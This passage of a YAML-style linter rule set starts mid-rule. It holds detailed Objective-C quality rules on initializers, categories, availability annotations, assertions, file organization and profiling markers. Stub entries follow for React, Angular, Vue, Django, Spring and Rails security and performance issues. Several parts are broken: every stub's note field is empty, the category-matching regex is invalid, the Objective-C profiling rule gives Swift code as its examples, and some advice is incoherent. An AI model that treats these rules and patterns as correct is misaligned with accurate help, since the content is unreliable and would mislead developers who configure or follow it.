- '- (instancetype)initWithValue:(nonnull id)value name:(nonnull NSString *)name {'
- '  // Call designated initializer'
- '  return [self initWithValue:value];'
- '}'
recommendation: 'Follow initialization patterns:

  - Use instancetype as return type (not id)

  - Implement [super init] first and check result

  - Establish one designated initializer per class

  - Other inits should call designated initializer

  - Return nil on initialization failure

  - Initialize all ivars in designated init

  - Use lazy initialization for expensive properties

  - Document required initialization steps

  '
mitigation: Use instancetype, call super init, designated pattern.

---
id: objc-qual-012
name: Category Usage
category: Quality
severity: Medium
description: Enforce proper category design and naming
pattern: '(@interface.*\\(|category|+|extension).*

  '
check_type: category_design
violations:
- '@interface NSString (MyExtension) // no prefix'
- '@interface MyClass (SomethingRandom) // multiple categories conflict'
- '@interface NSString (Transform) @property ... // property in category'
correct_usage:
- '@interface NSString (APP_MyExtension) // app-prefixed'
- '@interface MyClass (Transform)'
- '- (NSString *)uppercaseFirstLetter;'
- '@end'
- '// Separate files: MyClass+Transform.h/m'
recommendation: 'Use categories properly:

  - Use app/framework prefix to avoid collisions

  - One category per file (MyClass+Transform.m)

  - Don''t add properties to categories (use private class extension)

  - Don''t override existing methods in categories

  - Use for organizing related methods

  - Document cross-file dependencies

  - Consider private extensions for internal organization

  - Use +functionName for functions in categories

  '
mitigation: Use prefixes, one category per file, avoid properties.

---
id: objc-qual-013
name: Compatibility Annotations
category: Quality
severity: Medium
description: Enforce deprecation and availability annotations
pattern: "(DEPRECATED_ATTRIBUTE|NS_DEPRECATED|__attribute__|\n UNAVAILABLE_ATTRIBUTE|NS_UNAVAILABLE|available|introduced|deprecated).*\n"
check_type: compatibility
violations:
- '- (void)oldMethod { } // no deprecation marking'
- // No indication of iOS version requirements
- '- (void)newMethod // no availability marking'
correct_usage:
- '- (void)oldMethod NS_DEPRECATED_IOS(2_0, 5_0, "Use -newMethod instead")'
- '@available(iOS 13.0, *) - (void)modernMethod { }'
- API_AVAILABLE(ios(13.0)) - (void)newMethod { }
- NS_UNAVAILABLE - (void)unsupportedMethod { }
recommendation: 'Mark compatibility properly:

  - Use NS_DEPRECATED_IOS for deprecated methods

  - Use NS_UNAVAILABLE for removed methods

  - Use @available for version-specific code

  - Document replacement methods

  - Include minimum version requirements

  - Use __attribute__ for compiler directives

  - Test on minimum supported version

  '
mitigation: Add deprecation marks, @available, NS_UNAVAILABLE.

---
id: objc-qual-014
name: Assertion and Defensive Programming
category: Quality
severity: Medium
description: Enforce defensive programming with assertions
pattern: "(NSAssert|NSAssert[1-5]|NSParameterAssert|NSCAssert|\n assert|@throw|precondition|postcondition).*\n"
check_type: assertions
violations:
- '- (void)setName:(NSString *)name { _name = name; } // no validation'
- '- (NSString *)getName { return _name; } // could be nil'
- NSArray *array = ...; [array objectAtIndex:index] // no bounds check
correct_usage:
- '- (void)setName:(nonnull NSString *)name {'
- '  NSParameterAssert(name);'
- '  NSParameterAssert(name.length > 0);'
- '  _name = [name copy];'
- '}'
- '- (void)insertObject:(nonnull id)obj atIndex:(NSUInteger)idx {'
- '  NSAssert(idx <= [_items count], @"Index out of bounds");'
- '  [_items insertObject:obj atIndex:idx];'
- '}'
recommendation: 'Use assertions for defense:

  - Use NSParameterAssert for parameter validation

  - Use NSAssert for invariant validation

  - Use NSCAssert for C code assertions

  - Assertions compile out in Release builds

  - Add assertions after guard statements

  - Use descriptive assertion messages

  - Test with assertions enabled

  - Don''t rely on assertions for user input validation

  '
mitigation: Add NSParameterAssert, NSAssert for validation.

---
id: objc-qual-015
name: Code Organization and Structure
category: Quality
severity: Medium
description: Enforce proper code organization within files
pattern: "(pragma mark|MARK|interface|implementation|synthesize|\n extension|private|public|protected).*\n"
check_type: code_organization
violations:
- // No organization, methods in random order
- '@interface/@implementation mixed'
- // Private and public methods interleaved
correct_usage:
- '@interface MyClass ()'
- '@property (nonatomic) NSString *private;'
- '@end'
- '@implementation MyClass'
- '#pragma mark - Lifecycle'
- '- (instancetype)init { ... }'
- '- (void)dealloc { ... }'
- '#pragma mark - Public Methods'
- '- (void)publicMethod { ... }'
- '#pragma mark - Private Methods'
- '- (void)privateMethod { ... }'
- '#pragma mark - Getters & Setters'
- '@end'
recommendation: 'Organize code properly:

  - Use #pragma mark for section organization

  - Group related methods together

  - Order: lifecycle, public, private, getters/setters

  - Use private class extension for private properties

  - Keep implementation organized by functionality

  - Use separate files for categories

  - Limit file size (<500 lines is good)

  - Document complex sections with comments

  '
mitigation: 'Use #pragma mark, organize by section, private extensions.'

---
id: objc-qual-016
name: Performance Profiling Markers
category: Quality
severity: Low
description: Enforce use of performance profiling markers
pattern: "(os_log|os_signpost|signpost_interval_begin|signpost_interval_end|\n SIGNPOST_|OSLog).*\n"
check_type: profiling_markers
inefficient_patterns:
- // No profiling markers in critical paths
- // Complex operations without timing
efficient_patterns:
- 'os_log(.info, log: OSLog.default, "Starting operation")'
- 'os_signpost(.begin, log: OSLog.default, name: "DataLoad")'
- '[performWork]'
- 'os_signpost(.end, log: OSLog.default, name: "DataLoad")'
recommendation: 'Add profiling markers:

  - Use os_log for informational logging

  - Use os_signpost for performance intervals

  - Mark critical operations for profiling

  - Test with Instruments signpost tool

  - Use appropriate log levels (debug, info, error)

  - Profile on actual devices

  - Remove debug logs in production

  '
mitigation: Add os_signpost markers for profiling, use os_log.

---
id: react-xss-dangerously-inner-html
tags:
- Security
severity: error
message: 'Quality: XSS via dangerouslySetInnerHTML'
note: '|'
language: javascript

---
id: react-state-management-side-effects
tags:
- Quality
severity: error
message: 'Quality: State Management and Side Effects Anti-patterns'
note: '|'
language: javascript

---
id: react-unnecessary-rerenders
tags:
- Performance
severity: warning
message: 'Quality: Unnecessary Component Re-renders'
note: '|'
language: javascript

---
id: react-memo-prop-drilling
tags:
- Performance
severity: warning
message: 'Quality: memo() Ineffective with Deep Props'
note: '|'
language: javascript

---
id: react-useeffect-cleanup
tags:
- Quality
severity: error
message: 'Quality: Missing useEffect Cleanup Functions'
note: '|'
language: javascript

---
id: react-native-secure-storage
tags:
- Security
severity: error
message: 'Quality: Storing Sensitive Data Insecurely'
note: '|'
language: javascript

---
id: angular-template-injection
tags:
- Security
severity: error
message: 'Quality: Template Injection and XSS'
note: '|'
language: typescript

---
id: angular-change-detection
tags:
- Performance
severity: warning
message: 'Quality: Inefficient Change Detection Strategy'
note: '|'
language: typescript

---
id: angular-unsubscribe-memory-leak
tags:
- Quality
severity: error
message: 'Quality: Unsubscribed Observables Cause Memory Leaks'
note: '|'
language: typescript

---
id: angular-trackby-ngfor
tags:
- Performance
severity: warning
message: 'Quality: Missing trackBy in *ngFor Loops'
note: '|'
language: typescript

---
id: vue-v-html-xss
tags:
- Security
severity: error
message: 'Quality: XSS via v-html Directive'
note: '|'
language: javascript

---
id: vue-reactive-pitfalls
tags:
- Quality
severity: error
message: 'Quality: Reactive Object Pitfalls and Anti-patterns'
note: '|'
language: javascript

---
id: vue-computed-vs-methods
tags:
- Performance
severity: warning
message: 'Quality: Computed Properties vs Methods Optimization'
note: '|'
language: javascript

---
id: vue-watcher-cleanup
tags:
- Quality
severity: error
message: 'Quality: Watcher Memory Leaks and Cleanup'
note: '|'
language: javascript

---
id: django-sql-injection
tags:
- Security
severity: error
message: 'Quality: SQL Injection via Raw Queries'
note: '|'
language: python

---
id: django-xss-template-injection
tags:
- Security
severity: error
message: 'Quality: XSS and Template Injection'
note: '|'
language: python

---
id: django-csrf-bypass
tags:
- Security
severity: error
message: 'Quality: CSRF Protection Bypass'
note: '|'
language: python

---
id: django-n-plus-one-queries
tags:
- Performance
severity: error
message: 'Quality: N+1 Query Problem'
note: '|'
language: python

---
id: django-settings-security
tags:
- Security
severity: error
message: 'Quality: Insecure Settings Configuration'
note: '|'
language: python

---
id: django-model-mass-assignment
tags:
- Security
severity: warning
message: 'Quality: Mass Assignment / Over-posting'
note: '|'
language: python

---
id: spring-spel-injection
tags:
- Security
severity: error
message: 'Quality: SpEL (Spring Expression Language) Injection'
note: '|'
language: java

---
id: spring-mass-assignment
tags:
- Security
severity: error
message: 'Quality: Mass Assignment / Unsafe Deserialization'
note: '|'
language: java

---
id: spring-actuator-exposure
tags:
- Security
severity: error
message: 'Quality: Exposed Actuator Endpoints'
note: '|'
language: java

---
id: spring-connection-pooling
tags:
- Performance
severity: warning
message: 'Quality: Database Connection Pool Misconfiguration'
note: '|'
language: java

---
id: spring-caching-pitfalls
tags:
- Quality
severity: warning
message: 'Quality: Caching Issues and Cache Invalidation'
note: '|'
language: java

---
id: spring-bean-scope-confusion
tags:
- Quality
severity: warning
message: 'Quality: Bean Scope Misuse and Thread Safety'
note: '|'
language: java

---
id: rails-mass-assignment
tags:
- Security
severity: error
message: 'Quality: Mass Assignment Vulnerability'
note: '|'
language: ruby

---
id: rails-sql-injection
tags:
- Security
severity: error
message: 'Quality: SQL Injection'
note: '|'
language: ruby

---
id: rails-xss-prevention
tags:
- Security
severity: error
message: 'Quality: XSS via Unsafe HTML Rendering'
note: '|'
language: ruby

---
id: rails-n-plus-one-queries
tags:
- Performance
severity: error
message: 'Quality: N+1 Query Problem'
note: '|'
language: ruby

---
id: rails-caching-invalidation
tags:
- Performance
severity: warning
message: 'Quality: Cache Invalidation and Fragment Caching'
note: '|'
language: ruby

---
id: rails-convention-patterns
tags:
- Quality
severity: warning
message: 'Quality: Rails Convention Over Configuration Best Practices'
note: '|'
language: ruby

---
id: rails-testing-patterns
tags:
- Quality
severity: warning
message: 'Quality: Testing Best Practices and Patterns'
note: '|'
language: ruby
